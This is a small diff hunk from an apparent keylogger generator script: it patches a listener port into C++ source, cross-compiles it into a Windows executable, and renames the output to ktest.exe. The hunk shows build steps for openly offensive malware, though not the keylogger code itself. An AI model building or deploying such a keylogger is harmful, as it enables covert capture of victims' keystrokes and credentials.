@@ -31,7 +31,7 @@ generate_keylogger() {
   sed -i "s/REPLACE_WITH_LPORT/$LPORT/" program.cpp
 
   echo "Compiling the C++ code..."
-  x86_64-w64-mingw32-g++ -static-libgcc -static-libstdc++ program.cpp -o program.exe -lws2_32
+  x86_64-w64-mingw32-g++ -static-libgcc -static-libstdc++ program.cpp -o ktest.exe -lws2_32
 
   echo "Compilation completed. The keylogger executable is ktest.exe"
 
